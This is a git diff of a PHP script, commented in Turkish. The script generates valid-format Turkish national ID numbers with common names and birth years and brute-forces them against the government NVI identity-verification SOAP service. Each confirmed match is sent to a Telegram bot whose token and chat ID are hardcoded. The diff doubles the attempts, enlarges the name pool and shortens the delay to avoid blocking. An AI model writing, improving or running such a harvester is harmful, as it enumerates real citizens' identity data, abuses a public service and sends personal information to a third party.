@@ -3,15 +3,15 @@ header('Content-Type: text/html; charset=utf-8');
 set_time_limit(0);
 
 // --- TELEGRAM AYARLARI ---
-$botToken = "8405664089:AAEJi8ipuYWCeKpRSFFYGINACt4Sej1xeNI"; // BotFather'dan aldığın kod
-$chatId = "8258235296";     // UserInfoBot'tan aldığın ID
+$botToken = "8405664089:AAEJi8ipuYWCeKpRSFFYGINACt4Sej1xeNI"; 
+$chatId = "8258235296";
 
 function telegramGonder($mesaj, $token, $id) {
     $url = "https://api.telegram.org/bot$token/sendMessage?chat_id=$id&text=" . urlencode($mesaj);
     @file_get_contents($url);
 }
 
-// --- TC ÜRETİCİ ---
+// --- TC ÜRETİCİ (ALGORİTMAYA UYGUN) ---
 function tcUret() {
     $digits = [rand(1, 9)];
     for ($i = 1; $i < 9; $i++) $digits[$i] = rand(0, 9);
@@ -45,7 +45,6 @@ function nviSorgula($tc, $ad, $soyad, $yil) {
     curl_setopt($ch, CURLOPT_HTTPHEADER, [
         'Content-Type: text/xml; charset=utf-8',
         'SOAPAction: "http://tckimlik.nvi.gov.tr/WS/TCKimlikNoDogrula"',
-        'Content-Length: ' . strlen($xml)
     ]);
 
     $response = curl_exec($ch);
@@ -53,26 +52,42 @@ function nviSorgula($tc, $ad, $soyad, $yil) {
     return (strpos($response, '<TCKimlikNoDogrulaResult>true</TCKimlikNoDogrulaResult>') !== false);
 }
 
-// Havuzlar
-$isimler = ["MEHMET", "MUSTAFA", "AHMET", "ALİ", "HÜSEYİN", "AYŞE", "FATMA", "EMİNE"];
-$soyisimler = ["YILMAZ", "KAYA", "DEMİR", "ŞAHİN", "ÇELİK", "YILDIZ"];
+// İSİM VE SOYİSİM HAVUZUNU GENİŞLET
+$isimler = ["MEHMET", "MUSTAFA", "AHMET", "ALİ", "HÜSEYİN", "HASAN", "İBRAHİM", "MURAT", "AYŞE", "FATMA", "EMİNE", "HATİCE"];
+$soyisimler = ["YILMAZ", "KAYA", "DEMİR", "ŞAHİN", "ÇELİK", "YILDIZ", "YILDIRIM", "ÖZTÜRK", "AYDIN", "ASLAN"];
 
-echo "<h2>Tarama Başlatıldı...</h2>";
+echo "<h2>Çift Kanallı Tarama Başlatıldı...</h2>";
 
-for($i=0; $i<50; $i++) {
-    $tc = tcUret();
-    $ad = $isimler[array_rand($isimler)];
-    $soyad = $soyisimler[array_rand($soyisimler)];
-    $yil = rand(1975, 2005);
+for($i=0; $i<100; $i++) {
+    // 1. İŞLEM: Rastgele TC + Havuzdan İsim
+    $tc1 = tcUret();
+    $ad1 = $isimler[array_rand($isimler)];
+    $soyad1 = $soyisimler[array_rand($soyisimler)];
+    $yil1 = rand(1970, 2005);
 
-    if (nviSorgula($tc, $ad, $soyad, $yil)) {
-        $msg = "✅ KİŞİ BULUNDU!\nTC: $tc\nİsim: $ad $soyad\nYıl: $yil";
+    if (nviSorgula($tc1, $ad1, $soyad1, $yil1)) {
+        $msg = "✅ KİŞİ BULUNDU (Kanal 1)!\nTC: $tc1\nAd Soyad: $ad1 $soyad1\nYıl: $yil1";
         telegramGonder($msg, $botToken, $chatId);
-        echo "<b style='color:green;'>BULUNDU: $tc - Telegram'a İletildi!</b><br>";
-    } else {
-        echo "Denendi: $tc (Olumsuz)<br>";
+        echo "<b style='color:green;'>BULUNDU: $tc1</b><br>";
     }
-    flush(); // Ekrana anlık basar
-    usleep(300000); // 0.3 sn bekle
+
+    // 2. İŞLEM: Farklı Kombinasyon (Ad Soyad Odaklı)
+    $tc2 = tcUret(); // Yeni bir TC
+    $ad2 = $isimler[array_rand($isimler)];
+    $soyad2 = $soyisimler[array_rand($soyisimler)];
+    $yil2 = rand(1970, 2005);
+
+    if (nviSorgula($tc2, $ad2, $soyad2, $yil2)) {
+        $msg = "✅ KİŞİ BULUNDU (Kanal 2)!\nTC: $tc2\nAd Soyad: $ad2 $soyad2\nYıl: $yil2";
+        telegramGonder($msg, $botToken, $chatId);
+        echo "<b style='color:green;'>BULUNDU: $tc2</b><br>";
+    }
+
+    echo "."; // İşlem devam ediyor işareti
+    if ($i % 10 == 0) echo "<br>Denemeler sürüyor...<br>";
+    
+    ob_flush();
+    flush();
+    usleep(200000); // 0.2 saniye bekle (Bloklanmamak için)
 }
 ?>
